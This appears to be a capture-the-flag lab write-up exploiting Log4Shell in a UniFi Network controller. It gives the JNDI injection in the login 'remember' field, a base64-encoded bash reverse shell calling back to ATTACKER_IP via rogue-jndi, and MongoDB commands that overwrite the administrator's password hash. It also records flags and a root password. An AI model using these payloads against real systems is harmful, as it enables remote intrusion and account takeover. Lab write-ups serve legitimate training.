## enumeration
target: 10.129.96.149
tun0: 10.10.15.209

nmap scan: 22,6789,8080,8443
8443 is a tomcat server

software running: unifi network 6.4.54 
vulnerable to CVE-2021-44228 log4j2

"Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled."
https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228 

## Exploit
https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
The vulnerability is in the remember value issued in the login request.

```
POST /api/login HTTP/2
{"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
```

Payload: a jndi injection
`${jndi:ldap://vulnerableserver.org/whatever}`

For this we need rogue-jndi which is a malicious LDAP server that we'll run on our attacker host.
https://github.com/veracode-research/rogue-jndi

We compile it with Maven (needs openjdk and maven packages)
Then we craft a reverse shell and b64 encode it.

```bash
echo 'bash -c bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1' | base64
```

```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "ATTACKER_IP"
```

we open a netcat listener at 4444 and we trigger the reverse shell with the payload thanks to BurpSuite's repeater.
```json
{"username":"aaaaa","password":"aaaaa","remember":"${jndi:ldap://10.10.15.209:1389/o=tomcat}","strict":true}
```

user flag:
6ced1a6a89e666c0620cdb10262ba127

mongoDB service running on 27117
default unifi db name: ace
https://community.ui.com/questions/External-MongoDB-Server/d311a8f8-43b6-4aeb-859d-eefec9dc1bbc

```bash
mongo --port 27117
```
we use `show dbs` to confirm that ace exists.
we access it with `use ace`
then we list collections with `show collections`
there is a collection "admin" which contains details about users credentials
we list it with `db.admin.find()`
we can see the "administrator" entry among others
the x_shadow field is the hashed password
algorith is SHA 512 so not crackable
instead we can update administrator's password
we use mkpasswd in order to do that

```bash
mkpasswd -m sha-512 azerty012
```

$6$x6zHaKN8UaipZPU4$DC92Hv5fRDGmzWoxt80LeqM2bPsKa6eks3ES8BtgwOSfPuIzkkcv6hpKvkvt3llkUEuz5N2eA3QDVXPu44fRv.

then we use `db.admin.update()` to update the administrator entry
administrator's id being :
```
"_id" : ObjectId("61ce278f46e0fb0012d47ee4")
```
the command will be:
```
db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$x6zHaKN8UaipZPU4$DC92Hv5fRDGmzWoxt80LeqM2bPsKa6eks3ES8BtgwOSfPuIzkkcv6hpKvkvt3llkUEuz5N2eA3QDVXPu44fRv."}})
```

now we can connect to the UI using our password
administrator:azerty012

root Passwd is NotACrackablePassword4U2022
let's connect using ssh

root flag is e50bc93c75b634e4b272d2f771c33681

